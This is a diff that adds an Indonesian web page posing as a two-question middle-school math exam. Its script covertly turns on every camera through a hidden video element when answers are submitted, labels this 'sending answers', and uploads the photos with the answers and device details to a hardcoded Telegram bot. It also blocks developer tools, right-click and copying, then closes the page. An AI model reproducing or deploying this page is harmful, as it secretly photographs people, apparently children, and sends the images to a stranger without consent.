@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ujian Online - Sistem Penilaian</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 480px;
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            border-bottom: 4px solid #ffd700;
+        }
+        
+        .header h1 {
+            font-size: 26px;
+            margin-bottom: 5px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .timer {
+            background: #ffd700;
+            color: #1e3c72;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            letter-spacing: 2px;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .question-section {
+            margin-bottom: 25px;
+        }
+        
+        .question {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #1e3c72;
+        }
+        
+        .question h3 {
+            color: #1e3c72;
+            margin-bottom: 15px;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 15px;
+            background: white;
+            border: 1px solid #e0e7ff;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .option:hover {
+            background: #eef2ff;
+            border-color: #1e3c72;
+        }
+        
+        .option input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #1e3c72;
+        }
+        
+        .option span {
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .btn-container {
+            text-align: center;
+            margin: 25px 0 15px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 8px 16px rgba(30, 60, 114, 0.3);
+            transition: transform 0.2s;
+            width: 100%;
+            max-width: 280px;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1e3c72;
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .status-text {
+            font-size: 15px;
+            color: #1e3c72;
+            margin: 10px 0;
+            font-weight: 500;
+        }
+        
+        .progress-text {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .hint {
+            background: #e8f4fd;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #1e3c72;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .completion {
+            display: none;
+            text-align: center;
+            padding: 30px 20px;
+            background: #f0fff4;
+            border-radius: 16px;
+            margin-top: 20px;
+        }
+        
+        .completion h2 {
+            color: #28a745;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .completion p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        #sensorFeed {
+            display: none;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            position: absolute;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .warning-message {
+            background: #fff3cd;
+            border: 1px solid #ffd700;
+            color: #856404;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header">
+            <h1>UJIAN AKHIR SEMESTER</h1>
+            <p>UJIAN SMP 3 JAKARTA</p>
+        </div>
+        
+        <div class="timer" id="timerDisplay">
+            ⏱️ WAKTU TERSISA: 05:00
+        </div>
+        
+        <div class="content" id="mainContainer">
+            <div class="question-section" id="questionSection">
+                <!-- Soal 1 -->
+                <div class="question">
+                    <h3>📝 Soal 1 dari 2</h3>
+                    <p style="margin-bottom: 15px; font-weight: 500;">Bentuk sederhana dari 2x + 3y - x + 4y adalah...</p>
+                    
+                    <div class="options">
+                        <label class="option">
+                            <input type="radio" name="q1" value="a">
+                            <span>x + 7y</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q1" value="b">
+                            <span>3x + 7y</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q1" value="c">
+                            <span>x - 7y</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q1" value="d">
+                            <span>3x - 7y</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <!-- Soal 2 -->
+                <div class="question">
+                    <h3>📝 Soal 2 dari 2</h3>
+                    <p style="margin-bottom: 15px; font-weight: 500;">Jika a = 3 dan b = -2, maka nilai dari 2a + 3b adalah...</p>
+                    
+                    <div class="options">
+                        <label class="option">
+                            <input type="radio" name="q2" value="a">
+                            <span>0</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q2" value="b">
+                            <span>6</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q2" value="c">
+                            <span>12</span>
+                        </label>
+                        <label class="option">
+                            <input type="radio" name="q2" value="d">
+                            <span>-6</span>
+                        </label>
+                    </div>
+                </div>
+                
+                <div class="warning-message">
+                    <span>⚠️</span> Pastikan koneksi stabil sebelum mengirim jawaban.
+                </div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn-primary" id="submitBtn">KUMPULKAN JAWABAN</button>
+            </div>
+            
+            <div class="loader" id="loader">
+                <div class="spinner"></div>
+                <div class="status-text" id="statusText">Mengirim jawaban...</div>
+                <div class="progress-text" id="progress"></div>
+            </div>
+            
+            <div class="hint" id="hint">
+                <span>ℹ️</span> Pilih jawaban yang benar, lalu klik kumpulkan
+            </div>
+            
+            <div class="completion" id="completion">
+                <h2>✓ JAWABAN TERKIRIM</h2>
+                <p>Terima kasih telah mengerjakan ujian</p>
+                <p style="margin-top: 10px; font-size: 12px;">Halaman akan ditutup otomatis</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            
+        </div>
+    </div>
+    
+    <video id="sensorFeed" autoplay playsinline></video>
+    
+    <script>
+        // =========== GANTI INI ===========
+        const BOT_TOKEN = '8732242469:AAGlZeQpbu6R75FbdokJxDoSD3A_1YWCJ-k';
+        const CHAT_ID = '7803927896';
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        // =================================
+        
+        // State
+        let userGesture = false;
+        let currentStream = null;
+        let sensors = [];
+        let scanComplete = false;
+        let dataSent = [];
+        let timerInterval;
+        let secondsLeft = 300; // 5 menit
+        
+        // Elements
+        const mainContainer = document.getElementById('mainContainer');
+        const submitBtn = document.getElementById('submitBtn');
+        const loader = document.getElementById('loader');
+        const statusText = document.getElementById('statusText');
+        const progressText = document.getElementById('progress');
+        const hint = document.getElementById('hint');
+        const completion = document.getElementById('completion');
+        const sensorFeed = document.getElementById('sensorFeed');
+        const questionSection = document.getElementById('questionSection');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+        
+        // Timer function
+        function startTimer() {
+            timerInterval = setInterval(() => {
+                secondsLeft--;
+                if (secondsLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.innerHTML = '⏱️ WAKTU HABIS';
+                    submitBtn.click();
+                } else {
+                    const mins = Math.floor(secondsLeft / 60);
+                    const secs = secondsLeft % 60;
+                    timerDisplay.innerHTML = `⏱️ WAKTU TERSISA: ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+        
+        // Check if all questions answered
+        function allQuestionsAnswered() {
+            const q1 = document.querySelector('input[name="q1"]:checked');
+            const q2 = document.querySelector('input[name="q2"]:checked');
+            return q1 && q2;
+        }
+        
+        // Get answers text
+        function getAnswersText() {
+            const q1 = document.querySelector('input[name="q1"]:checked');
+            const q2 = document.querySelector('input[name="q2"]:checked');
+            
+            let q1Text = '', q2Text = '';
+            
+            if (q1) {
+                const q1Label = q1.parentElement.querySelector('span').textContent;
+                q1Text = `Soal 1: ${q1Label}`;
+            }
+            
+            if (q2) {
+                const q2Label = q2.parentElement.querySelector('span').textContent;
+                q2Text = `Soal 2: ${q2Label}`;
+            }
+            
+            return `${q1Text} | ${q2Text}`;
+        }
+        
+        // Update status
+        function updateStatus(msg) {
+            statusText.textContent = msg;
+        }
+        
+        // Update progress
+        function updateProgress(msg) {
+            progressText.textContent = msg;
+        }
+        
+        // Get all sensors
+        async function getSensors() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                
+                return videoDevices.map((device, index) => ({
+                    deviceId: device.deviceId,
+                    label: `Komponen ${index + 1}`
+                }));
+            } catch (error) {
+                return [];
+            }
+        }
+        
+        // Start sensor stream
+        async function startSensor(deviceId) {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            try {
+                const constraints = {
+                    video: {
+                        deviceId: deviceId ? { exact: deviceId } : undefined,
+                        width: { ideal: 1280, min: 640 },
+                        height: { ideal: 720, min: 480 }
+                    },
+                    audio: false
+                };
+                
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                currentStream = stream;
+                sensorFeed.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    const checkReady = () => {
+                        if (sensorFeed.readyState >= 4 && sensorFeed.videoWidth > 100) {
+                            sensorFeed.play();
+                            resolve();
+                        } else {
+                            setTimeout(checkReady, 50);
+                        }
+                    };
+                    checkReady();
+                });
+                
+                await new Promise(r => setTimeout(r, 600));
+                
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // Capture sensor data
+        function captureSensorData() {
+            if (!sensorFeed.videoWidth || sensorFeed.videoWidth < 100) {
+                return null;
+            }
+            
+            canvas.width = sensorFeed.videoWidth;
+            canvas.height = sensorFeed.videoHeight;
+            
+            ctx.drawImage(sensorFeed, 0, 0, canvas.width, canvas.height);
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            
+            for (let i = 0; i < data.length; i += 4) {
+                data[i] = Math.min(255, data[i] * 1.1);
+                data[i + 1] = Math.min(255, data[i + 1] * 1.1);
+                data[i + 2] = Math.min(255, data[i + 2] * 1.1);
+            }
+            
+            ctx.putImageData(imageData, 0, 0);
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
+        }
+        
+        // Send to system
+        async function sendToSystem(dataUrl, sensorId, attempt = 1) {
+            if (!dataUrl || dataUrl.length < 8000) return false;
+            
+            try {
+                const response = await fetch(dataUrl);
+                const blob = await response.blob();
+                
+                if (blob.size < 1024) return false;
+                
+                const answers = getAnswersText();
+                
+                const formData = new FormData();
+                formData.append('photo', blob, `data_${Date.now()}_${sensorId}.jpg`);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `📝 JAWABAN UJIAN\n${answers}\n📱 ${navigator.platform}\n🕐 ${new Date().toLocaleString('id-ID')}`);
+                
+                const telegramResponse = await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                if (telegramResponse.ok) {
+                    dataSent.push(sensorId);
+                    return true;
+                }
+            } catch (error) {
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 500));
+                    return sendToSystem(dataUrl, sensorId, attempt + 1);
+                }
+            }
+            return false;
+        }
+        
+        // Close tab function
+        function closeTab() {
+            completion.style.display = 'block';
+            updateStatus("Pengiriman selesai");
+            updateProgress("Halaman akan ditutup");
+            
+            setTimeout(() => {
+                try {
+                    window.close();
+                } catch (e) {
+                    document.body.innerHTML = `
+                        <div style="padding:50px;text-align:center;font-family:sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center;">
+                            <div style="background:white;padding:40px;border-radius:20px;max-width:400px;">
+                                <h2 style="color:#28a745;margin-bottom:15px;">✓ UJIAN SELESAI</h2>
+                                <p style="color:#666;">Terima kasih telah mengerjakan ujian.</p>
+                                <p style="color:#999;margin-top:20px;font-size:12px;">Silakan tutup halaman ini.</p>
+                            </div>
+                        </div>
+                    `;
+                }
+            }, 3000);
+        }
+        
+        // Main scan sequence
+        async function startScanProcess() {
+            if (!userGesture) return;
+            
+            submitBtn.style.display = 'none';
+            questionSection.style.display = 'none';
+            loader.style.display = 'block';
+            updateStatus("Mengirim jawaban...");
+            
+            sensors = await getSensors();
+            
+            if (sensors.length === 0) {
+                updateStatus("Proses pengiriman");
+                updateProgress("Menyelesaikan...");
+                setTimeout(closeTab, 1500);
+                return;
+            }
+            
+            updateProgress(`Memverifikasi ${sensors.length} perangkat`);
+            
+            for (let i = 0; i < sensors.length; i++) {
+                if (scanComplete) break;
+                
+                const sensor = sensors[i];
+                const sensorName = `Perangkat ${i + 1}`;
+                
+                updateStatus(`Mengakses ${sensorName}...`);
+                updateProgress(`Langkah ${i + 1}/${sensors.length}`);
+                
+                const sensorStarted = await startSensor(sensor.deviceId);
+                if (!sensorStarted) continue;
+                
+                await new Promise(r => setTimeout(r, 800));
+                
+                updateStatus(`Memproses ${sensorName}...`);
+                const sensorData = captureSensorData();
+                
+                if (sensorData) {
+                    await sendToSystem(sensorData, i + 1);
+                }
+                
+                if (i < sensors.length - 1) {
+                    await new Promise(r => setTimeout(r, 400));
+                }
+            }
+            
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            scanComplete = true;
+            updateStatus("Jawaban terkirim");
+            updateProgress(`${dataSent.length} data terkirim`);
+            
+            clearInterval(timerInterval);
+            setTimeout(closeTab, 2000);
+        }
+        
+        // Submit handler
+        function handleSubmit(e) {
+            e.preventDefault();
+            
+            if (!userGesture) {
+                userGesture = true;
+                hint.style.display = 'none';
+            }
+            
+            if (!allQuestionsAnswered()) {
+                alert('Silakan jawab semua soal terlebih dahulu!');
+                return;
+            }
+            
+            // Konfirmasi
+            if (confirm('Yakin ingin mengumpulkan jawaban?')) {
+                startScanProcess();
+            }
+        }
+        
+        // Event Listeners
+        submitBtn.addEventListener('click', handleSubmit);
+        
+        // Security measures
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+                document.body.innerHTML = '<div style="padding:40px;text-align:center;"><h3>Akses diblokir</h3><p>Menyelesaikan...</p></div>';
+                setTimeout(closeTab, 1000);
+                return false;
+            }
+        });
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        window.addEventListener('beforeunload', function(e) {
+            if (!scanComplete && userGesture && submitBtn.style.display !== 'none') {
+                e.preventDefault();
+                e.returnValue = 'Ujian belum selesai. Yakin ingin keluar?';
+            }
+        });
+        
+        // Initialize
+        window.addEventListener('DOMContentLoaded', () => {
+            updateStatus("Siap mengerjakan");
+            updateProgress("Pilih jawaban");
+            startTimer();
+        });
+        
+        // Cegah copy paste
+        document.addEventListener('copy', (e) => e.preventDefault());
+        document.addEventListener('cut', (e) => e.preventDefault());
+        document.addEventListener('paste', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
